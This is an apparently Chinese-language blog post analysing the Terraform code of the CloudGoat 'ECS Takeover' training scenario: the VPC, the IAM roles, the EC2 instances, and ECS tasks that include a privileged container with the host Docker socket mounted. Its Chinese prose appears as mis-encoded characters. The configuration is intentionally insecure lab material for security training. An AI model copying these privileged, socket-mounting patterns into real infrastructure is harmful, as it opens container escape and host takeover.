<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>[CloudGoat]ECS Takeover | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="[CloudGoat]ECS Takeover | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="ECSå¿«é€Ÿå…¥é—¨
Amazon Elastic Container Service (Amazon ECS) æ˜¯AWSä¸Šçš„ä¸€ä¸ªå®¹å™¨ç¼–æ’æœåŠ¡ï¼Œå®ƒå’ŒK8sçš„åŒºåˆ«åœ¨äºECSæ˜¯Amazonè‡ªå·±å®ç°çš„å®¹å™¨ç¼–æ’æ–¹æ¡ˆï¼Œè€ŒK8sæ˜¯Googleçš„å¼€æºå®¹å™¨ç¼–æ’è§£..." />
    <meta name="keywords" content="ECS,CloudGoat,Terraform,äº‘å®‰å…¨,AWS" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              [CloudGoat]ECS Takeover
            </h2>
            <div class="post-info">
              <span>
                2024-07-15
              </span>
              <span>
                22 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/H7j08QruO/" class="post-tag">
                  # ECS
                </a>
              
                <a href="https://skyblu3519.github.io/tag/udTQ5jCzp/" class="post-tag">
                  # CloudGoat
                </a>
              
                <a href="https://skyblu3519.github.io/tag/IM02GT8L2N/" class="post-tag">
                  # Terraform
                </a>
              
                <a href="https://skyblu3519.github.io/tag/8Ilrlif21/" class="post-tag">
                  # äº‘å®‰å…¨
                </a>
              
                <a href="https://skyblu3519.github.io/tag/su2_uaPzNg/" class="post-tag">
                  # AWS
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/cloudgoatecs-takeover.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="ecså¿«é€Ÿå…¥é—¨">ECSå¿«é€Ÿå…¥é—¨</h1>
<p>Amazon Elastic Container Service (Amazon ECS) æ˜¯AWSä¸Šçš„ä¸€ä¸ªå®¹å™¨ç¼–æ’æœåŠ¡ï¼Œå®ƒå’ŒK8sçš„åŒºåˆ«åœ¨äºECSæ˜¯Amazonè‡ªå·±å®ç°çš„å®¹å™¨ç¼–æ’æ–¹æ¡ˆï¼Œè€ŒK8sæ˜¯Googleçš„å¼€æºå®¹å™¨ç¼–æ’è§£å†³æ–¹æ¡ˆã€‚</p>
<p>é€šè¿‡ä¸‹é¢çš„å›¾å¿«é€Ÿäº†è§£ä¸‹ECSçš„å„ä¸ªç»„ä»¶<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720886254514-106f0f9a-96c6-469b-8e6b-7cbf1258cd8e.png" alt="image.png" loading="lazy"></p>
<ul>
<li>Cluster manager å¯ä»¥ç®¡ç†ä¸€ä¸ª Cluster ä¸Šçš„æ‰€æœ‰ Contaienr Instanceã€‚</li>
<li>Contaienr Instance æ˜¯ä¸€ä¸ª Linux ä¸»æœºï¼Œä¸Šé¢è¿è¡Œç€ Docker Engine å’Œ ECS Container Agentã€‚Contaienr Instance ä¼šå‘ Cluster manager æ³¨å†Œæ¥è®©å…¶å¯¹è‡ªå·±è¿›è¡Œç®¡ç†ã€‚</li>
<li>Service æ˜¯ä¸€ä¸ªä»»åŠ¡æ¸…å•ï¼ŒCluster manager ä¼šé€šè¿‡å„ç§æ–¹å¼åœ¨ Contaienr Instance ä¸Šå®ç°/ç»´æŒè¿™äº›ä»»åŠ¡ã€‚ä¸€ä¸ª Service ä¸­åŒ…å« Task Number å’Œ Task Definitionã€‚
<ul>
<li>Task Number æŒ‡çš„æ˜¯ Task çš„æ•°é‡ã€‚</li>
<li>Task Definition åˆ™æ˜¯ Task çš„å…·ä½“å†…å®¹ï¼Œå®ƒåŒ…æ‹¬ä¸€ä¸ª Container Definitionsã€‚Container Definitions åˆ™æ˜¯ä¸€ä¸ªé•œåƒå’Œé•œåƒçš„å¯åŠ¨å‘½ä»¤ã€‚</li>
</ul>
</li>
<li>Role ç®¡ç†ï¼Œåœ¨æ•´ä¸ª ECS ä¸­æ¶‰åŠ4ä¸ª Roleï¼Œå…¶ä¸­ Service RoleğŸ”µ å’Œ Task Execution RoleğŸŸ  å±äºåŠŸèƒ½ Role ç”¨æˆ·ä¸ç”¨å¤ªå…³å¿ƒã€‚å‰©ä¸‹ä¸¤ä¸ªï¼ŒTask RoleğŸŸ£ æ˜¯ä¸ºå…·ä½“æ‰§è¡Œä»»åŠ¡çš„ Container æä¾›çš„ Roleï¼Œå®ƒæ‰€æ¶‰åŠçš„äº‘èµ„æºçš„ä½¿ç”¨è¦ç”¨æˆ·æä¾›ï¼›ä¸€å° Contaienr Instance ä¸Šçš„ Container è¿˜å¯ä»¥ä½¿ç”¨è¿™å° Contaienr Instance RoleğŸ”´ çš„èµ„æºã€‚</li>
</ul>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸Šé¢çš„ ECS æ˜¯ EC2 Modeã€‚é™¤æ­¤ä¹‹å¤– AWS è¿˜æä¾›äº†ä¸€ä¸ª Fargate çš„ ECSï¼Œåœ¨ Fargate ä¸­ Contaienr Instance åœ¨ç”¨æˆ·è§†è§’ä¸­å°†å®Œå…¨éšè—ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥æ›´ä¸“æ³¨äº Service çš„ç¼–å†™ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052962707-ed760d33-d084-4e64-b930-b24cba9dadc8.png" alt="image.png" loading="lazy"></p>
<h1 id="tfä»£ç åˆ†æ">TFä»£ç åˆ†æ</h1>
<p>é™¤å»provider.tfã€outputs.tfã€variables.tfï¼Œå„ä¸ªèµ„æºéƒ½æ˜¯ç±»åˆ«åç§°å¯¹åº”è‡ªå·±çš„ tf æ–‡ä»¶<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720887770678-b7088e85-1469-4cac-88e5-2e7c4ece50b0.png" alt="image.png" loading="lazy"></p>
<h2 id="vpctf">vpc.tf</h2>
<p>åœ¨å°†ECSå¯åŠ¨å‰ï¼Œéœ€è¦æœ‰ä¸€ä¸ªæ‰¿è½½è¿™äº›èµ„æºçš„VPCã€‚ä»£ç é¦–å…ˆå®šä¹‰çš„ä¸€ä¸ªVPCçš„åŸºæœ¬å†…å®¹ï¼ŒåŒ…æ‹¬ä¸€ä¸ªVPCï¼ŒåŒæ—¶ä¸ºVPCæ·»åŠ ä¸€ä¸ªç½‘å…³å’Œä¸€ä¸ªå­ç½‘ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;vpc&quot; {
  cidr_block           = &quot;10.0.0.0/16&quot;
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
  }
}

resource &quot;aws_internet_gateway&quot; &quot;internet_gateway&quot; {
  vpc_id = aws_vpc.vpc.id

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
  }
}

resource &quot;aws_subnet&quot; &quot;public&quot; {
  vpc_id            = aws_vpc.vpc.id
  availability_zone = &quot;us-east-1a&quot;
  cidr_block        = &quot;10.0.1.0/24&quot;

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
  }
}
</code></pre>
<p>æ¥ç€åˆ›å»ºäº†æŒ‡å‘ç½‘å…³çš„é»˜è®¤è·¯ç”±ï¼ŒåŒæ—¶å°†è¯¥è·¯ç”±ä¸å­ç½‘å…³è”</p>
<pre><code class="language-yaml">resource &quot;aws_route_table&quot; &quot;public&quot; {
  vpc_id = aws_vpc.vpc.id

  route {
    cidr_block = &quot;0.0.0.0/0&quot;
    gateway_id = aws_internet_gateway.internet_gateway.id
  }

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
  }
}

resource &quot;aws_route_table_association&quot; &quot;route_table_association&quot; {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}
</code></pre>
<p>æœ€ååœ¨VPCä¸­å®šä¹‰äº†ä¸€ä¸ªå®‰å…¨ç»„å…è®¸ TCP æµé‡åˆ°ç«¯å£ 80 (HTTP) å’Œç«¯å£ 443 (HTTPS)ã€‚æº IP åœ°å€èŒƒå›´åˆ™æ ¹æ® <code>var.cg_whitelist</code> æ¥ç¡®å®šï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ CloudGoat é…ç½®æ—¶çš„ whitelist é€‰é¡¹ï¼ˆ0.0.0.0/0ï¼‰ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_security_group&quot; &quot;ecs_sg&quot; {
  vpc_id                 = aws_vpc.vpc.id
  revoke_rules_on_delete = true

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = &quot;tcp&quot;
    cidr_blocks = var.cg_whitelist
  }

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = &quot;tcp&quot;
    cidr_blocks = var.cg_whitelist
  }

  egress {
    from_port   = 0
    to_port     = 65535
    protocol    = &quot;tcp&quot;
    cidr_blocks = [&quot;0.0.0.0/0&quot;]
  }

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-sg&quot;
  }
}
</code></pre>
<h2 id="iamtf">iam.tf</h2>
<p>iam.tfé‡Œé¢å®šä¹‰äº†ä¸¤ä¸ª IAM Roleï¼Œä¾› Contaienr Instance ä½¿ç”¨çš„ <code>ecs_agent</code> å’Œä¾› Task ä½¿ç”¨çš„ <code>privd</code></p>
<pre><code class="language-yaml">//
// ECS Worker Instance Role
//
data &quot;aws_iam_policy_document&quot; &quot;ecs_agent&quot; {
  statement {
    actions = [&quot;sts:AssumeRole&quot;]

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;ec2.amazonaws.com&quot;]
    }
  }
}

resource &quot;aws_iam_role&quot; &quot;ecs_agent&quot; {
  name               = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
  assume_role_policy = data.aws_iam_policy_document.ecs_agent.json
}


resource &quot;aws_iam_role_policy_attachment&quot; &quot;ecs_agent&quot; {
  role       = aws_iam_role.ecs_agent.name
  policy_arn = &quot;arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role&quot;
}

resource &quot;aws_iam_instance_profile&quot; &quot;ecs_agent&quot; {
  name = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
  role = aws_iam_role.ecs_agent.name
}



//
//  ECS Container role
//

data &quot;aws_iam_policy_document&quot; &quot;ecs_tasks_role&quot; {
  statement {
    actions = [&quot;sts:AssumeRole&quot;]

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;ecs-tasks.amazonaws.com&quot;]
    }
  }
}



resource &quot;aws_iam_role&quot; &quot;privd&quot; {
  name                = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
  assume_role_policy  = data.aws_iam_policy_document.ecs_tasks_role.json
  managed_policy_arns = [aws_iam_policy.privd.arn]
}

// Give the role read access to ecs and IAM permissions.
resource &quot;aws_iam_policy&quot; &quot;privd&quot; {
  name = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;

  policy = jsonencode({
    Version = &quot;2012-10-17&quot;
    Statement = [
      {
        Action = [
          &quot;ecs:ListServices&quot;,
          &quot;ecs:ListTasks&quot;,
          &quot;ecs:DescribeServices&quot;,
          &quot;ecs:ListContainerInstances&quot;,
          &quot;ecs:DescribeContainerInstances&quot;,
          &quot;ecs:DescribeTasks&quot;,
          &quot;ecs:ListTaskDefinitions&quot;,
          &quot;ecs:DescribeClusters&quot;,
          &quot;ecs:ListClusters&quot;,
          &quot;iam:GetPolicyVersion&quot;,
          &quot;iam:GetPolicy&quot;,
          &quot;iam:ListAttachedRolePolicies&quot;,
          &quot;iam:GetRolePolicy&quot;
        ]
        Effect   = &quot;Allow&quot;
        Resource = &quot;*&quot;
      },
    ]
  })
}
</code></pre>
<p>å…¶ä¸­<code>ecs_agent</code>ç›´æ¥ä½¿ç”¨çš„AWSæ‰˜ç®¡ç­–ç•¥<code>AmazonEC2ContainerServiceforEC2Role</code>ã€‚æ ¹æ®å¯¹è¯¥ç­–ç•¥çš„æè¿°ï¼Œè¿™æ˜¯ä¸€ä¸ªECSä¸­EC2çš„é»˜è®¤ç­–ç•¥ã€‚å…¶ä¸­åŒ…æ‹¬å¯¹ CloudWatch Logsã€EC2ã€Elastic Container Registryã€Elastic Container Service çš„æœ‰é™è®¿é—®ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720890039990-0cd1019a-7de0-4a9a-8b72-8f2c9e3490fb.png" alt="image.png" loading="lazy"></p>
<p>è€Œ<code>privd</code>ç­–ç•¥æ¶‰åŠå¯¹ AWS ECS å’Œ IAM æœåŠ¡çš„æŸ¥è¯¢å’Œè·å–ä¿¡æ¯çš„æ“ä½œã€‚</p>
<pre><code class="language-yaml">{
  Action = [
    &quot;ecs:ListServices&quot;,
    &quot;ecs:ListTasks&quot;,
    &quot;ecs:DescribeServices&quot;,
    &quot;ecs:ListContainerInstances&quot;,
    &quot;ecs:DescribeContainerInstances&quot;,
    &quot;ecs:DescribeTasks&quot;,
    &quot;ecs:ListTaskDefinitions&quot;,
    &quot;ecs:DescribeClusters&quot;,
    &quot;ecs:ListClusters&quot;,
    &quot;iam:GetPolicyVersion&quot;,
    &quot;iam:GetPolicy&quot;,
    &quot;iam:ListAttachedRolePolicies&quot;,
    &quot;iam:GetRolePolicy&quot;
  ]
  Effect   = &quot;Allow&quot;
  Resource = &quot;*&quot;
}
</code></pre>
<h2 id="ec2tf">ec2.tf</h2>
<p>ec2.tfä¸»è¦å®šä¹‰äº†ä¸¤ä¸ª EC2 å®ä¾‹ã€‚å…¶ä¸­å®ƒä»¬ä½¿ç”¨äº† AWS å®˜æ–¹ä¸º ECS æœåŠ¡å®šåˆ¶çš„ AMI</p>
<pre><code class="language-yaml">data &quot;aws_ami&quot; &quot;ecs&quot; {
  most_recent = true
  owners      = [&quot;amazon&quot;]

  filter {
    name   = &quot;name&quot;
    values = [&quot;amzn2-ami-ecs-hvm-*&quot;]
  }

  filter {
    name   = &quot;virtualization-type&quot;
    values = [&quot;hvm&quot;]
  }

  filter {
    name   = &quot;architecture&quot;
    values = [&quot;x86_64&quot;]
  }
}
</code></pre>
<p>ä¸‹é¢è¿™æ®µ<code>user_data</code>æ˜¯è®© EC2 å®ä¾‹å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œå‘½ä»¤<code>echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config</code>æ¥è‡ªåŠ¨åŠ å…¥ cluster</p>
<pre><code class="language-yaml">locals {
  user_data = &lt;&lt;EOH
#!/bin/bash
echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config
EOH
}
</code></pre>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…³è”çš„è§’è‰²å’Œå®‰å…¨ç»„çš„é…ç½®ï¼Œå‡æ˜¯å‰é¢é…ç½®å¥½çš„ã€‚åŒæ—¶è¿™ä¸¤ä¸ª EC2 éƒ½å…³è”äº†å…¬ç½‘ IP <code>associate_public_ip_address = true</code></p>
<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
  ami                         = data.aws_ami.ecs.id
  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
  user_data                   = local.user_data
  instance_type               = &quot;t2.micro&quot;
  associate_public_ip_address = true
  subnet_id                   = aws_subnet.public.id

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
  }
}

resource &quot;aws_instance&quot; &quot;vault&quot; {
  ami                         = data.aws_ami.ecs.id
  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
  user_data                   = local.user_data
  instance_type               = &quot;t2.micro&quot;
  associate_public_ip_address = true
  subnet_id                   = aws_subnet.public.id

  tags = {
    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;
  }
}
</code></pre>
<h2 id="ecstf">ecs.tf</h2>
<p>ecs.tfå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p>
<ul>
<li>å®šä¹‰ Cluster</li>
<li>å®šä¹‰ Task Definition</li>
<li>å®šä¹‰ Service</li>
</ul>
<p>å®šä¹‰ Cluster æ¯”è¾ƒç®€å•åªåŒ…å«ä¸€ä¸ª name å‚æ•°</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_cluster&quot; &quot;ecs_cluster&quot; {
  name = &quot;${var.scenario-name}-${var.cgid}-cluster&quot;
}
</code></pre>
<p>ç„¶åæ˜¯ä¸‰ä¸ª Task Definition çš„å®šä¹‰ï¼Œè¿™é‡Œçœ‹ä¸‹æœ€åä¸€ä¸ª<code>vulnsite</code></p>
<ul>
<li>ä»»åŠ¡å®šä¹‰åŸºæœ¬é…ç½®
<ul>
<li><code>family</code>: ä»»åŠ¡å®šä¹‰çš„å®¶æ—åï¼Œè¿™é‡Œä½¿ç”¨ Terraform å˜é‡ <code>var.scenario-name</code> å’Œ <code>var.cgid</code> åŠ¨æ€ç”Ÿæˆã€‚å·®ä¸å¤šå°±æ˜¯ä¸€ä¸ªåç§°ã€‚</li>
<li><code>network_mode</code>: è®¾ç½®ä¸º <code>&quot;host&quot;</code>ï¼Œè¡¨æ˜ä»»åŠ¡å°†ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œå‘½åç©ºé—´ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå®¹å™¨å°†ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œï¼Œä¸ä¼šè™šæ‹ŸåŒ–æˆ–éš”ç¦»ç½‘ç»œã€‚</li>
</ul>
</li>
<li>å®¹å™¨å®šä¹‰
<ul>
<li><code>name</code>: å®¹å™¨çš„åç§°ï¼Œè®¾ä¸º <code>&quot;vulnsite&quot;</code>ã€‚</li>
<li><code>image</code>: å®¹å™¨ä½¿ç”¨çš„é•œåƒï¼Œè¿™é‡Œæ˜¯ <code>&quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;</code>ï¼Œè¡¨ç¤ºä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ cloudgoat/ecs-takeover-vulnsite é•œåƒã€‚</li>
<li><code>essential</code>: è®¾ç½®ä¸º <code>true</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªå®¹å™¨å¿…é¡»åœ¨è¿è¡Œæ—¶å§‹ç»ˆå¤„äºè¿è¡ŒçŠ¶æ€ï¼›å¦‚æœå®ƒå¤±è´¥ï¼ŒECS å°†åœæ­¢æ•´ä¸ªä»»åŠ¡ã€‚</li>
<li><code>privileged</code>: è®¾ç½®ä¸º <code>true</code>ï¼Œèµ‹äºˆå®¹å™¨æå‡çš„æƒé™ï¼Œå…è®¸å®ƒè®¿é—®å®¿ä¸»æœºçš„èµ„æºï¼Œè¿™åœ¨éœ€è¦æ‰§è¡Œç‰¹å®šç³»ç»Ÿæ“ä½œçš„æƒ…å†µä¸‹æ˜¯å¿…éœ€çš„ã€‚</li>
<li><code>network_mode</code>: æŒ‡å®šäº† <code>&quot;awsvpc&quot;</code>ã€‚æ ¹æ®è¿‡å¾€æ–‡æ¡£çš„æè¿°<code>awsvpc</code>ç½‘ç»œæ¨¡å¼æä¾›çš„ä»»åŠ¡è”ç½‘åŠŸèƒ½ä½¿ Amazon ECS ä»»åŠ¡å…·æœ‰ä¸ Amazon EC2 å®ä¾‹ç›¸åŒçš„è”ç½‘å±æ€§ã€‚æ„Ÿè§‰å’Œå‰é¢çš„<code>network_mode: &quot;host&quot;</code>æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸çŸ¥é“æ˜¯é…åˆä½¿ç”¨è¿˜æ˜¯å†²çªè®¾ç½®ã€‚</li>
<li><code>cpu</code> å’Œ <code>memory</code>: åˆ†åˆ«è®¾ç½®å®¹å™¨çš„ CPU å’Œå†…å­˜é™åˆ¶ï¼Œè¿™é‡Œæ˜¯ 256 CPU å•ä½å’Œ 256 MB å†…å­˜ã€‚</li>
<li><code>portMappings</code>: å®šä¹‰ç«¯å£æ˜ å°„ï¼Œè¿™é‡Œå°†å®¹å™¨çš„ 80 ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 80 ç«¯å£ï¼Œä½¿å®¹å™¨å¯ä»¥å¤„ç† HTTP æµé‡ã€‚</li>
<li><code>mountPoints</code>: å®šä¹‰æŒ‚è½½ç‚¹ï¼Œå’Œåé¢çš„<code>volume</code>é€‰é¡¹é…åˆï¼Œé‡Œå°†å®¿ä¸»æœºçš„ <code>/var/run/docker.sock</code> æŒ‚è½½åˆ°å®¹å™¨çš„ç›¸åŒè·¯å¾„ä¸Šã€‚è¿™é€šå¸¸ç”¨äºå…è®¸å®¹å™¨å†…çš„åº”ç”¨ç®¡ç†å®¿ä¸»æœºä¸Šçš„ Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</li>
</ul>
</li>
<li>å·å®šä¹‰
<ul>
<li><code>name</code>: å·çš„åç§° <code>&quot;docker-socket&quot;</code>ã€‚</li>
<li><code>host_path</code>: å®šä¹‰å®¿ä¸»æœºä¸Šçš„è·¯å¾„ <code>/var/run/docker.sock</code>ã€‚è¿™å…è®¸å®¹å™¨é€šè¿‡ Docker å¥—æ¥å­—ä¸å®¿ä¸»æœºçš„ Docker å®ˆæŠ¤è¿›ç¨‹äº¤äº’ã€‚</li>
</ul>
</li>
</ul>
<p>ç‰¹æƒæ¨¡å¼+<code>/var/run/docker.sock</code>æŒ‚è½½ï¼Œè¿™ä¸ªå®¹å™¨çš„å±é™©æ€§å·²ä¸è¨€è€Œå–»ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_task_definition&quot; &quot;vault&quot; {
  family = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;

  # Wait for the website to be deployed to the cluster.
  # This should make sure the instances are available.
  container_definitions = jsonencode([
    {
      name      = &quot;vault&quot;
      image     = &quot;busybox:latest&quot;
      essential = true
      cpu       = 50
      memory    = 50
      command   = [&quot;/bin/sh -c \&quot;echo '{{FLAG_1234677}}' &gt;  /FLAG.TXT; sleep 365d\&quot;&quot;]
      entryPoint = [
        &quot;sh&quot;,
        &quot;-c&quot;
      ]
    }
  ])
}

// Hosts the role we want to use to force rescheduling
resource &quot;aws_ecs_task_definition&quot; &quot;privd&quot; {
  family        = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
  task_role_arn = aws_iam_role.privd.arn
  container_definitions = jsonencode([
    {
      name      = &quot;privd&quot;
      image     = &quot;busybox:latest&quot;
      cpu       = 50
      memory    = 50
      essential = true
      command   = [&quot;sleep&quot;, &quot;365d&quot;]
    }
  ])
}

// Hosts website to container escape execution
resource &quot;aws_ecs_task_definition&quot; &quot;vulnsite&quot; {
  family       = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
  network_mode = &quot;host&quot;
  container_definitions = jsonencode([
    {
      name         = &quot;vulnsite&quot;
      image        = &quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;
      essential    = true
      privileged   = true
      network_mode = &quot;awsvpc&quot;
      cpu          = 256
      memory       = 256
      portMappings = [
        {
          containerPort = 80
          hostPort      = 80
        }
      ]
      mountPoints = [
        {
          readOnly      = false,
          containerPath = &quot;/var/run/docker.sock&quot;
          sourceVolume  = &quot;docker-socket&quot;
        }
      ]
    }
  ])

  volume {
    name      = &quot;docker-socket&quot;
    host_path = &quot;/var/run/docker.sock&quot;
  }
}
</code></pre>
<p>æœ€åæ˜¯ä¸‰ä¸ª Service çš„å®šä¹‰ã€‚<code>vulnsite</code>é€šè¿‡<code>memberOf</code>ç±»å‹çš„çº¦æŸï¼Œè®©ä»»åŠ¡çš„éƒ¨ç½²å¿…é¡»æ»¡è¶³è¡¨è¾¾å¼<code>ec2InstanceId == ${aws_instance.vulnsite.id}</code>ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šäº† EC2 å®ä¾‹ IDã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vulnsite&quot; {
  name            = &quot;vulnsite&quot;
  cluster         = aws_ecs_cluster.ecs_cluster.id
  task_definition = aws_ecs_task_definition.vulnsite.arn
  desired_count   = 1

  placement_constraints {
    type       = &quot;memberOf&quot;
    expression = &quot;ec2InstanceId == ${aws_instance.vulnsite.id}&quot;
  }
}
</code></pre>
<p>é¢„ç½®å™¨(Provisioner)æ˜¯ç”± Terraform æ‰€æä¾›çš„å¦ä¸€ç»„æ’ä»¶ï¼Œæ¯ç§é¢„ç½®å™¨å¯ä»¥åœ¨èµ„æºå¯¹è±¡åˆ›å»ºåæ‰§è¡Œä¸åŒç±»å‹çš„æ“ä½œã€‚<code>vault</code>ä¸­çš„<code>Provisioner</code>è¡¨ç¤ºåœ¨åˆ›å»ºèµ„æºåæ‰§è¡Œä¸€ä¸ªPythonè„šæœ¬<code>remove_placement_constraints.py</code>ï¼ŒåŒæ—¶é…ç½®äº†æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„ç¯å¢ƒå˜é‡ã€‚</p>
<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vault&quot; {
  name                 = &quot;vault&quot;
  cluster              = aws_ecs_cluster.ecs_cluster.id
  task_definition      = aws_ecs_task_definition.vault.arn
  force_new_deployment = true
  desired_count        = 1


  depends_on = [
    aws_ecs_service.vulnsite,
  ]

  ordered_placement_strategy {
    type = &quot;random&quot;
  }

  // Setting this here ensures vault start's on the right instance, this setting is removed in the provisioner below.
  placement_constraints {
    type       = &quot;memberOf&quot;
    expression = &quot;ec2InstanceId == ${aws_instance.vault.id}&quot;
  }

  provisioner &quot;local-exec&quot; {
    command = &quot;/usr/bin/env python3 remove_placement_constraints.py&quot;
    environment = {
      CLUSTER            = self.cluster
      SERVICE_NAME       = self.name
      AWS_DEFAULT_REGION = var.region
      AWS_PROFILE        = var.profile
    }
  }
}

</code></pre>
<p><code>remove_placement_constraints.py</code>è„šæœ¬åˆ™æ˜¯åœ¨vaultæœåŠ¡å¯åŠ¨åç§»é™¤æœåŠ¡çš„æ”¾ç½®é™åˆ¶</p>
<pre><code class="language-python">&quot;&quot;&quot;Removes the PlacmentConstraints set for a given cluster/service.&quot;&quot;&quot;
import boto3
import time
from os import environ

ecs = boto3.client('ecs', region_name='us-east-1')

cluster = environ['CLUSTER']
service_name = environ['SERVICE_NAME']

while True:
    resp = ecs.list_tasks(
        cluster=cluster,
        serviceName=service_name,
        desiredStatus=&quot;RUNNING&quot;,
    )
    if len(resp['taskArns']) &gt; 0:
        break

    print(f&quot;Waiting for tasks in the service {service_name} to enter the the RUNNING state.&quot;)
    time.sleep(5)

ecs.update_service(
    cluster=cluster,
    service=service_name,
    placementConstraints=[],
)
</code></pre>
<h2 id="outputstf">outputs.tf</h2>
<p>æœ€åçš„<code>outputs.tf</code>å°†å®ä¾‹çš„<code>public_dns</code>å±æ€§è¾“å‡ºï¼Œè¿™æ˜¯AWS ä¸ºæ¯ä¸ªå…·æœ‰å…¬ç½‘ IP çš„ EC2 å®ä¾‹è‡ªåŠ¨åˆ†é…ä¸€ä¸ªå…¬å…± DNS åç§°ã€‚</p>
<pre><code class="language-yaml">output &quot;vuln-site&quot; {
  value = aws_instance.vulnsite.public_dns
}
</code></pre>
<p>å…³äºDNSè§£æçš„é…ç½®æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯å®ä¾‹ä¸­é…ç½®äº†å…³è”å…¬ç½‘IP</p>
<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
  ...
  associate_public_ip_address = true
  ...
}
</code></pre>
